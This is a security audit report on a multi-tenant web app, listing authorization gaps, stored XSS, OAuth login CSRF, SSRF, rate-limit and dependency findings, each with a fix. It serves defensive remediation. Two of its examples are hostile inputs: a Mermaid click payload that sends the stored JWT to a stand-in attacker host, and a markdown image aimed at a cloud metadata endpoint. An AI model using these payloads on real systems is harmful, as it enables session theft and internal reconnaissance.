# Astrozen — Phase 1: Security Findings

**Date:** 2026-08-30 · **Scope:** Backend + Frontend, per `AUDIT_PLAN.md` Phase 1 checklist
**Method:** Full-file manual reads (three parallel review passes covering AuthN/AuthZ+IDOR, injection/SSRF/XSS, and config/secrets/rate-limiting/logging) plus real tool runs: `bandit`, `pip-audit`, `npm audit`, `alembic check`, a full-history git secret scan, and a live `pip install`/`npm ci` to observe actual resolved dependency versions. Every finding below cites a file:line its author personally opened and read. No secret values are printed in full.

Total: **4 Critical · 4 High · 6 Medium · 5 Low**, plus 16 explicitly-verified clean/informational items.

---

## Critical

### SEC-1: Self-obtainable "admin" role bypasses organization isolation on Projects/Issues/Features/Milestones
**Severity:** Critical — free, self-service privilege escalation with full cross-tenant read/write/delete on the app's core resources.
**File:** `Backend/app/api/deps.py:79-81` (`check_is_admin`), used unconditionally as a bypass in `check_is_team_leader:86-88`, `check_is_team_member:91-95`, `check_can_manage_project:98-126`, `check_can_edit_issue:129-152`, `check_can_edit_feature:155-175`; root cause enabler `Backend/app/services/organization_service.py:46`.
**Evidence:**
```python
# deps.py:79-81
def check_is_admin(user: User) -> bool:
    return user.role == "admin"          # no organization comparison

# organization_service.py: creator of ANY new org becomes admin, no approval
user.role = "admin"
```
Any registered user can `POST /api/v1/organizations` (no restriction beyond "you don't already have one") to instantly become `role="admin"`, which then satisfies the bypass check in all five predicates above — for a project/issue/feature/team belonging to **any** organization, not just their own. `Backend/app/api/v1/teams.py:87,109` proves the codebase already knows the correct pattern (org-match check before the admin bypass); it just isn't applied in `deps.py`.
**Impact:** After registering and creating one throwaway organization, an attacker can `PATCH`/`DELETE` any tenant's projects, features, issues, and milestones (`projects.py:134-294`, `features.py:91,149,197,266`, `issues.py:144,164`).
**Fix:** Fetch the resource, compare its `organization_id` to `user.organization_id`, **then** check admin — in that order — in all five `deps.py` predicates, mirroring `teams.py`'s existing pattern. Effort: **S** (~20 lines, one file).

---

### SEC-2: AI Idea/Blueprint/Document engine has no ownership check on ~29 of ~34 routes
**Severity:** Critical — leaks every tenant's confidential business idea, validation report, and generated documents to any authenticated user, and lets them mutate or materialize that data as their own project.
**File:** `Backend/app/api/v1/ai_projects.py` — confirmed at lines 56, 466-475, 496-505, 1565-1577, 1933-1942, 2041-2053, plus 18 more `crud_project_idea.project_idea.get(db=db, id=idea_id)` call sites with no follow-up check. Root cause: `ProjectIdea.user_id` (`app/models/project_idea.py:24-26`) exists but is checked in exactly **one** of ~23 call sites.
**Evidence — the one route that does it right, proving the fix is a known one-line pattern:**
```python
# ai_projects.py:920-924 (answer_questions)
idea = crud_project_idea.project_idea.get(db=db, id=idea_id)
if not idea:
    raise HTTPException(status_code=404, detail="Idea not found")
if idea.user_id != str(current_user.id):
    raise HTTPException(status_code=403, detail="Not enough permissions")
```
**Evidence — representative unprotected routes (all missing the check above):**
```python
@router.get("/ideas/{project_id}")                     # ai_projects.py:466
async def get_project_ideas(project_id: str, ...):
    ideas = db.query(ProjectIdea).filter(ProjectIdea.project_id == project_id).all()
    return {"ideas": [...raw_input, refined_description...]}   # no org/owner check

# convert_to_project (ai_projects.py:2041) — mutates AND cross-org
idea = crud_project_idea.project_idea.get(db=db, id=idea_id)
team = db.query(Team).filter(Team.id == team_id).first()   # team_id also unchecked
new_project = Project(..., team_id=team_id, lead_id=current_user.id, ...)
```
**Impact:** Any authenticated user can read any other tenant's raw idea text, refined description, validation report (market feasibility, tech stack, pricing model), and generated documents; `generate_issues_for_node` and others mutate another tenant's data; `convert_to_project` lets an attacker materialize **any** other tenant's validated idea into a project the attacker can then see, using an also-unchecked `team_id`. Every route in this set is billable against `OPENROUTER_API_KEY`.
**Scope note:** 9 of 34 routes were individually read and confirmed vulnerable (chosen to cover read/list/mutate/cross-entity-creation); the remaining ~20 idea-scoped routes call the same unfiltered `.get()` and almost certainly share the gap but are marked **needs verification** rather than individually asserted.
**Fix:** Add one `deps.py` helper (`get_owned_idea(db, idea_id, current_user)`) that does what line 924 already does inline, and swap all ~23 call sites to use it. For `convert_to_project`, additionally validate `team_id` via the existing `check_is_team_member`. Effort: **M** — mechanical, touches ~25 call sites in one file.

---

### SEC-3: `documents.py` — every ID-based route trusts `doc_id` alone
**Severity:** Critical — read, delete, overwrite, and AI-chat access to any tenant's document, exercised against the real Google Drive/R2 backends.
**File:** `Backend/app/api/v1/documents.py:17-46, 70-82, 84-102, 104-117, 119-161, 163-194, 196-231` — all 8 routes.
**Evidence:**
```python
# get_document (:77), delete_document (:91), sync_document (:112),
# upload_document (:127), apply_change (:171), chat_document (:204) — identical pattern
doc = db.query(Document).filter(Document.id == doc_id).first()
if not doc:
    raise HTTPException(status_code=404, detail="Document not found")
# current_user is a required Depends() param but is never referenced below this point
```
`create_document` (`:17-27`) accepts a caller-supplied `project_id` with no check the caller has access to it.
**Impact:** Any authenticated user of any organization who has or guesses a `doc_id` can read metadata, permanently delete the live Google Doc, force a resync, overwrite content via upload, apply an AI text-replacement directly to the live document, or start a billable AI chat about its content. No admin escalation is even required.
**Fix:** Join `Document.project_id` → `Project.team_id` → `Team.organization_id`, compare to `current_user.organization_id` (exact pattern already correct at `features.py:128`), at the top of all six ID-based handlers, and validate `project_id` the same way in `create_document`. Effort: **S** — one helper, six call sites.

---

### SEC-B1: Stored XSS via Mermaid diagram source → JWT theft
**Severity:** Critical — attacker-controlled JS execution reaching the JWT that `Frontend/src/lib/api-client.ts:18` reads from `localStorage`; fires on ordinary page view, no admin privilege needed to plant it.
**File:** `Backend/app/api/v1/ai_projects.py:1458-1470` (unvalidated sink) → `Frontend/src/pages/ai-generator/page.tsx:767,794` (render call) → `Frontend/src/components/Mermaid.tsx:24,74` (unsafe config + raw `innerHTML`).
**Evidence:**
```python
# ai_projects.py:1458-1470
@router.put("/idea/{idea_id}/blueprint")
async def save_blueprint(idea_id: str, blueprint_in: Dict[str, Any], ...) -> Any:
    content = json.dumps({
        ...
        "user_flow_mermaid": blueprint_in.get("user_flow_mermaid", ""),  # raw string, stored verbatim
    })
    crud_project_idea.project_idea.create_or_update_asset(..., content=content, ...)
```
```tsx
// Mermaid.tsx:21-24, 74
mermaid.initialize({ ..., securityLevel: 'loose', ... });   // disables mermaid's own sanitization
...
ref.current.innerHTML = result.svg;   // raw, unsanitized SVG written directly into the live DOM
```
**Impact:** Any authenticated user can `PUT` a `user_flow_mermaid` payload containing a Mermaid `click` directive (e.g. `click A href "javascript:fetch('https://attacker.example/steal?t='+localStorage.getItem('token'))"`). `securityLevel: 'loose'` is Mermaid's own documented "unsafe for untrusted diagram source" setting, and the resulting SVG is written via `innerHTML` with no sanitization pass at all. Since ideas attach to shared projects, any teammate who opens that idea's blueprint view inherits the payload — this is stored XSS against other users, not just self-XSS. Combined with the JWT living in `localStorage` (SEC-7), successful execution is a full session takeover.
**Fix:** Two independent fixes, do both: (1) change `securityLevel: 'loose'` → `'strict'` (or `'antiscript'`) in `Mermaid.tsx:24`. (2) Replace `blueprint_in: Dict[str, Any]` with a real Pydantic schema bounding `user_flow_mermaid` (type, max length) and `nodes`/`edges` shape. Do not rely on Mermaid's sanitizer alone. Effort: **S**.

---

## High

### SEC-4: `issues.py` comment/activity endpoints have no authorization at all
**Severity:** High — cross-tenant read of comment threads/activity logs, plus ability to post into any tenant's issue.
**File:** `Backend/app/api/v1/issues.py:179-194 (add_comment), 197-205 (get_comments), 208-216 (get_activities)`.
**Evidence:**
```python
@router.get("/{issue_id}/comments", response_model=List[CommentSchema])
def get_comments(issue_id: UUID, ...):
    comments = crud_comment.get_by_issue(db, issue_id=issue_id)   # no existence or org check
    return comments
```
Contrast with `get_issue` in the same file (`:117-132`), which correctly checks `issue.team.organization_id != current_user.organization_id`.
**Impact:** Enumerate any `issue_id` to read another tenant's comment thread/activity history, or inject a comment into it.
**Fix:** Reuse the org-check already present at `issues.py:129` at the top of these three handlers. Effort: **S**.

---

### SEC-6: Google OAuth has no `state` parameter — login CSRF
**Severity:** High — one crafted link, no attacker authentication needed, results in a victim's browser being authenticated into an attacker-controlled account.
**File:** `Backend/app/services/google_auth.py:39-49`; `Backend/app/api/v1/google_auth.py:24-38`.
**Evidence:**
```python
# google_auth.py:41-48 — no "state" key anywhere
params = {"client_id": ..., "redirect_uri": ..., "response_type": "code", "scope": ..., "access_type": "offline", "prompt": "consent"}
```
```python
# api/v1/google_auth.py:26 — reads only `code`
def google_callback(request: Request, code: str | None = None, ...):
```
**Impact:** An attacker starts their own OAuth flow, obtains a fresh code for their own Google account, and gets a victim to load `GET .../auth/google/callback?code=<attacker's code>` (a bare GET, no CSRF token required, works via an ordinary link/img/iframe). The backend resolves/creates a local user for the **attacker's** Google email and sets it as the victim's `auth_token` cookie — the victim is now unknowingly using the attacker's account. `GOOGLE_REDIRECT_URI` is a fixed config value, so this is pure login-CSRF (no open-redirect needed).
**Fix:** Generate a random `state` in `google_login`, store it in a short-lived signed cookie, pass through to Google, reject the callback if it doesn't match. Effort: **S** (~15-20 lines across both files).

---

### SEC-B2: SSRF via `html2docx` image loader on user-controlled document content
**Severity:** High — server-side request forgery fully reachable by any authenticated user against their own uploaded content, no IDOR needed.
**File:** `Backend/app/api/v1/ai_projects.py:1822-1846` (vulnerable call site) → `:586-641` (injection point) → `html2docx` library's `image.py` (third-party, unrestricted `urllib.request.urlopen`).
**Evidence:**
```python
# ai_projects.py:1822-1846 — download_doc_as_docx
html_content = markdown.markdown(asset.content)     # asset.content may be user-supplied markdown
docx_io = html2docx(f"<html><body>{html_content}</body></html>", title=doc_type.value)  # fetches every <img src> server-side
```
```python
# ai_projects.py:586-641 — upload_document: raw uploaded markdown stored with zero sanitization of the body
```
**Impact:** A user uploads a `.md` file containing `![x](http://169.254.169.254/latest/meta-data/)` or an internal-network URL. `html2docx`'s image loader fetches it server-side via `urllib.request.urlopen` with no scheme/host restriction (`http://`, `https://`, and `file://` are all accepted) — a blind SSRF primitive (internal recon, cloud metadata endpoints if ever deployed on AWS/GCP/Azure), plus secondary disclosure if the fetched bytes are valid image data embedded in the resulting .docx.
**Fix:** Before `html2docx()`, strip/rewrite `<img>` tags whose `src` is not a `data:` URI or an explicit allowlisted domain (e.g., your own R2/CDN host) — a 5-10 line sanitization pass, not a library swap. Effort: **S**.

---

### SEC-C1: Zero rate limiting on all ~15 billable AI-generation routes
**Severity:** High — direct, unbounded financial exposure for a bootstrapped solo founder.
**File:** `Backend/app/api/v1/ai_projects.py` (`grep -c "limiter" app/api/v1/ai_projects.py` → `0`).
**Evidence:**
```
app/api/v1/auth.py:18:@limiter.limit("3/minute")        # register
app/api/v1/auth.py:31:@limiter.limit("10/minute")       # login
app/api/v1/google_auth.py:25:@limiter.limit("10/minute") # oauth callback
# nothing else in the entire backend imports or calls `limiter`
```
Confirmed unrated LLM-calling routes: `validate_idea` (:951), `generate_blueprint` (:1381), `generate_document` (:1566), `regenerate_doc_section` (:1774), `generate_document_enhancement` (:2221), and ~10 more `ai_service.` call sites in the same file.
**Impact:** Any authenticated user (or a leaked/shared JWT) can script unlimited OpenRouter calls with zero backend throttle — a single overnight script is a direct, uncapped bill.
**Fix:** Add `@limiter.limit(...)` to the AI-generation routes (a generous `20/hour` per-user/IP stops scripted abuse without hurting real usage); cheapest form is one shared limit wired at the router level. Effort: **S**.

---

## Medium

### SEC-5: `features.py` milestone create/update skip the check their sibling delete uses
**Severity:** Medium — cross-tenant write on a known `feature_id`, bounded to milestone metadata.
**File:** `Backend/app/api/v1/features.py:214-228 (create_milestone), 231-249 (update_milestone)` vs `252-277 (delete_milestone)`, which correctly calls `check_can_edit_feature`.
**Fix:** Add the same guard to the two missing handlers. Effort: **S**.

### SEC-9: `projects.py` update-comments and reactions have no authorization check
**Severity:** Medium — cross-tenant comment/reaction spam.
**File:** `Backend/app/api/v1/projects.py:297-315 (create_update_comment), 343-361/364-383 (reaction toggles)` — existence + path-consistency check only, no org/team membership check.
**Fix:** Reuse the org check already at `projects.py:125-131`. Effort: **S**.

### SEC-7: JWT duplicated into `localStorage`, nullifying the httpOnly cookie's XSS protection
**Severity:** Medium — the backend does the secure thing; the frontend independently defeats it.
**File:** `Frontend/src/lib/api-client.ts:18`; `Frontend/src/context/AuthContext.tsx:16,46,51`. Backend correctly sets `httponly=True, secure=True, samesite="lax"` at `Backend/app/api/v1/auth.py:47-55` and `google_auth.py:52-61`, but also returns the same token in the JSON body.
**Impact:** Any future XSS (e.g., SEC-B1) can `localStorage.getItem('token')` and exfiltrate a fully valid bearer token — the httpOnly cookie becomes a no-op since the same credential sits in a second, unprotected channel.
**Fix:** Since `apiClient` already has `withCredentials: true` and the backend already accepts the cookie (`deps.py:12-24`), stop storing/reading the token via `localStorage` and stop manually attaching the `Authorization` header. Effort: **S-M**.

### SEC-10: Google OAuth tokens stored in plaintext in production — `ENCRYPTION_KEY` is never set
**Severity:** Medium-High — real, broad-scope third-party credentials at rest with no encryption, gated on a DB-read compromise.
**File:** `Backend/app/core/encryption.py:18-21` (silent plaintext fallback); `render.yaml` and `Backend/render.yaml` (confirmed: `grep -c "ENCRYPTION_KEY"` → `0` in both files).
**Evidence:**
```python
# encryption.py:18-21
key = settings.ENCRYPTION_KEY
if not key:
    logger.warning("ENCRYPTION_KEY not set — OAuth tokens will be stored in plaintext")
    return None
```
`ENCRYPTION_KEY: str | None = None` (`config.py:87`) is not declared as an env var in either `render.yaml`, so unless it was added manually and out-of-band in Render's dashboard, production is running with this fallback active. The OAuth scope requested (`services/google_auth.py:35-36`) includes `https://www.googleapis.com/auth/documents` — broad read/write access to **all** of a user's Google Docs, not scoped to app-created files (unlike the narrower `drive.file` scope requested alongside it).
**Additional context (verified independently during Phase 2):** these tokens are currently dead code for live API access — `DocumentService` (`document_service.py:19-22`) uses a single shared service account for all real Drive/Docs operations, and `document_service._decrypt_user_tokens` (`:79-84`) and `tasks/sync_drive_to_r2.py`'s `refresh_google_token` (`:13-50`) are both defined but never called anywhere in the codebase. This lowers the *current* live-exploitation surface (nothing in the app itself reads these tokens today) but does not reduce the at-rest exposure: a DB backup leak, insider access, or a future SQL/IDOR bug that exposes the `users` table would hand an attacker a live, broad-scope Google credential per affected user, usable directly against Google's API outside this app entirely.
**Fix:** Set `ENCRYPTION_KEY` in the Render dashboard for both environments (generate with `Fernet.generate_key()`), verify it round-trips a real token. Given the tokens aren't currently used, consider also just narrowing the requested scope to `drive.file` only (drop `documents`) as a smaller-blast-radius alternative, or removing the unused capture path entirely (see Phase 2/3). Effort: **S** (set the env var) to **M** (if also removing dead code / narrowing scope).

### SEC-C2: `requirements.txt` has no upper bounds — live-demonstrated drift
**Severity:** Medium — reproducibility and supply-chain risk.
**File:** `Backend/requirements.txt:1-8`.
**Evidence:** Installing this exact file fresh in this session resolved `fastapi>=0.109.0` → **0.141.1**, `sqlalchemy>=2.0.25` → **2.0.52**, `python-jose>=3.3.0` → **3.5.0**, `cryptography>=41.0.0` → **50.0.1**, `alembic>=1.13.1` → **1.19.1** (full versions in `tmp/pip-freeze.txt`). 13 packages (`boto3`, `openai`, `mammoth`, `python-docx`, `markdown`, `html2docx`, `markdownify`, google libs, `apscheduler`, `slowapi`) have no bound at all.
**Impact:** Render's `buildCommand: pip install -r requirements.txt` re-resolves on every deploy — a new major version ships to production automatically with no review step.
**Fix:** `pip freeze > requirements-lock.txt` after verifying the current install works; point Render's `buildCommand` at the lockfile. Effort: **S**.

### SEC-C4: Two of ten `npm audit` findings ship into the production bundle
**Severity:** Medium — `mermaid` and `react-router`/`react-router-dom` are direct runtime `dependencies`, bundled into what Netlify serves.
**File:** `Frontend/package.json:56,66`.
**Evidence:** `mermaid` (moderate: prototype pollution, CSS-injection-to-sibling-elements, DoS) pulls in `dompurify <=3.4.12` (moderate: sanitizer bypass, IN_PLACE-hook XSS) — directly relevant to SEC-B1's `Mermaid.tsx:74` `innerHTML` sink, since Mermaid's own sanitizer is backed by this vulnerable dompurify range. `react-router`/`react-router-dom` (moderate: open redirect via backslash in `<Link>`/`useNavigate`) — this app is a client-rendered SPA (no SSR), so the SSR-hydration advisory in the same CVE family doesn't apply, but the open-redirect one does. The other 6 npm-audit advisories are build/lint/dev-server-only (traced via `npm ls`) and don't ship to production.
**Fix:** `npm audit fix` resolves both without a major bump per the audit tool's own output. Effort: **S**.

---

## Low

### SEC-8: No logout endpoint — the httpOnly cookie is never server-side revoked
**Severity:** Low. **File:** `audit_service.py:41` (`LOGOUT` constant defined, never referenced); `Frontend/src/services/auth.ts:46-49` only clears `localStorage`.
**Impact:** On a shared machine, "logout" leaves the httpOnly `auth_token` cookie live until natural expiry.
**Fix:** Add `POST /api/v1/auth/logout` calling `response.delete_cookie("auth_token", path="/")`. Effort: **S**.

### SEC-B3: Unvalidated input into a globally-unique R2 object key (data-integrity, not traversal)
**Severity:** Low — confirmed **not** exploitable as path traversal (S3/R2 keys are flat, opaque strings; `../` has no special meaning).
**File:** `Backend/app/api/v1/documents.py:16-27`.
**Evidence:** `title` (no length/charset validation) feeds directly into `Document.r2_path` (`documents.py:26`, model declares `unique=True`). Two titles colliding after `.replace(' ','_').lower()` raise an `IntegrityError`, caught by `except Exception as e: raise HTTPException(500, detail=str(e))` at `:44`, leaking the raw driver error string to the client. Same unvalidated pattern for upload `filename` at `ai_projects.py:604,639` — also confirmed non-traversal.
**Fix:** Slugify and cap length before use in the key; generate the key from a server-side UUID and keep `title` as a display-only field. Effort: **S**.

### SEC-B6: Pydantic schema coverage — one real input-side gap, two response-side gaps
**Severity:** Low. `ai_projects.py:1461`'s `Dict[str, Any]` is the root cause of SEC-B1 (fix together). `ai_projects.py:1933,2041` (`response_model=Any`) and `organizations.py:74` (`response_model=List[dict]`) are response-side only — both handlers currently hand-build safe dicts, so nothing leaks today, but no schema exists to catch a future accidental-leak change.
**Fix:** Not urgent standalone; replace with real response schemas next time these routes are touched.

### SEC-C3: `ecdsa` PYSEC-2026-1325 (Minerva timing attack) — transitive, unreachable
**Severity:** Low. **File:** transitive via `python-jose[cryptography]` (`pip show ecdsa` → `Required-by: python-jose`).
**Evidence:** `pip-audit -r requirements.txt` finds exactly this one CVE. `grep -rn "ecdsa" Backend/app/` → no matches; `config.py:45` allowlists only `{HS256, RS256}` — `ES256`/ECDSA is never a reachable algorithm choice in this app.
**Fix:** No action required now; note in Phase 5 so it isn't mistaken for live on future scans.

### SEC-C5: Audit-log `detail=str(e)` uses broad `except Exception` — verified low actual risk
**Severity:** Low. **File:** `auth.py:25-27,57-59`; `google_auth.py:36-38`.
**Evidence:** Traced every reachable exception path (`auth_service.register_user`/`login_user`, `crud.user.authenticate`, `verify_password`) — all explicit failures raise fixed generic messages; passwords are hashed before touching the DB layer; the OAuth path's `requests.HTTPError.__str__()` doesn't echo the POSTed body (which contains `client_secret`). No confirmed leak today; the residual risk is an unanticipated future exception type being logged verbatim.
**Fix:** Not urgent; if touched anyway, narrow the caught exception types. Effort: **S**.

---

## Checked, no finding (verified clean or informational)

- **CORS wildcard is structurally impossible.** `config.py:68-76`'s `reject_cors_wildcard` model validator runs unconditionally at `Settings()` instantiation (module import time) — if `BACKEND_CORS_ORIGINS` ever resolved to include `"*"`, the app **fails to boot** rather than serving a wildcard+credentials misconfiguration. Verified all three places the value is set (both `render.yaml`s use `sync: false`; `.env.example` and the code default both list explicit origins).
- **Git history has zero real committed secrets.** Full-history content scan (`git log --all -p | grep -inE "sk-...|AKIA...|BEGIN PRIVATE KEY|JWT_SECRET=...|postgres://user:pass@..."`) found exactly one match: a documentation placeholder `postgresql://postgres:password@localhost:5432/astrozen` in a since-deleted `Backend/README.md` — the literal word "password", not a real credential. Combined with Phase 0's file-level check (no `.env`/`.db`/`.log` ever committed), history is clean.
- **`RATE_LIMIT_ENABLED` defaults safely.** Not set in either `render.yaml`, but the code default is `True` (`config.py:84`) — safe by omission, though worth making explicit.
- **Frontend `VITE_*` exposure is clean.** Exactly two references (`VITE_API_BASE_URL`/`VITE_API_URL`), both the backend URL, not a secret.
- **JWT algorithm pinning is airtight.** `config.py:42-48` allowlists `{HS256, RS256}`; `security.py:67` pins `algorithms=[settings.ALGORITHM]` on decode — no algorithm-confusion path.
- **RS256 fallback (`security.py:8-23`) is dead code in production** — both `render.yaml`s hardcode `JWT_ALGORITHM: HS256` and expose neither `JWT_PRIVATE_KEY` nor `JWT_PUBLIC_KEY`.
- **No password-reset flow exists** (confirmed via repo-wide grep) — a product gap, not a vulnerability.
- **No refresh-token flow, no server-side JWT revocation** — single expiry-bound access token is the whole session model; a reasonable tradeoff at this stage, not flagged as a fix item.
- **bcrypt work factor is the library default** (cost 12) — reasonable, no action needed.
- **SQL injection: confirmed clean.** The only raw-SQL site (`core/database.py:59-60`) draws exclusively from a hardcoded dict literal in the same function, runs once at startup, no request-input path. Repo-wide re-grep for `.execute(`/`text(`/`.format()` found nothing else beyond googleapiclient's `.execute()` idiom (not SQL).
- **Filesystem path traversal: confirmed clean.** No code path anywhere writes a file to local disk using a user-supplied name; all document I/O is in-memory, Drive-API-keyed, or R2-key-based (opaque, non-hierarchical).
- **SSRF via other backend `requests` calls: confirmed clean** — every outbound call targets a hardcoded host constant; user-controlled values only ever populate a path segment or body field, never host/scheme. The only genuine SSRF is SEC-B2.
- **`chart.tsx`'s `dangerouslySetInnerHTML`: dead code.** The shadcn `ChartContainer` primitive that owns it is never imported/rendered anywhere in the frontend — no live attack surface (Phase 3 unused-scaffolding item).
- **`react-markdown` dependency: never imported anywhere** — dead weight, not a raw-HTML-passthrough risk (Phase 3 item).
- **`teams.py` and `notifications.py` are correctly scoped**, proving the codebase knows the right pattern: `teams.py:73,87,109` check organization match before any admin bypass; `notification_service.mark_as_read` filters by `recipient_id` server-side.
- **`get_project`, `get_feature`, `get_issue`, and the `list_*` endpoints for projects/issues/features all correctly compare or filter by `organization_id`** — the gaps found in this audit are concentrated in `ai_projects.py`, `documents.py`, and secondary-entity routes (comments/reactions/milestones), not the primary read paths.
- **No secret value is logged anywhere** — repo-wide grep for logger calls referencing `GOOGLE_SERVICE_ACCOUNT_INFO`, `access_token`, `refresh_token`, `SECRET_KEY`, or `password` returns nothing.

---

## Raw tool evidence

- `tmp/bandit-report.txt` — 12 issues (8 Low/4 Medium), all reviewed individually; the one Medium `B608` "possible SQL injection" hit (`ai_service.py:330`) is a **confirmed false positive** — it fires on an LLM prompt template string containing the word "Update", not SQL. The 3 `B113` (`requests` without timeout) hits are real but minor (DoS-by-hang risk under a slow/malicious counterparty, not a security bypass) — cheap fix, add `timeout=` to the 3 call sites in `google_auth.py`/`sync_drive_to_r2.py`.
- `tmp/pip-audit-requirements.txt`, `tmp/pip-audit-installed.txt` — 1 finding (`ecdsa`, SEC-C3), consistent across both the declared and fully-resolved dependency sets.
- `tmp/npm-audit.txt`, `tmp/npm-audit.json` — 10 findings, triaged into 2 that ship to production (SEC-C4) and 6 build/dev-only (full detail in DEPENDENCY_FINDINGS.md, Phase 5).
- Full-history git grep — see "Checked, no finding" above.

---

*Compiled from three independent full-file review passes plus direct verification of every citation above. Continuing to Phase 2 (Correctness & Bug Hunt).*
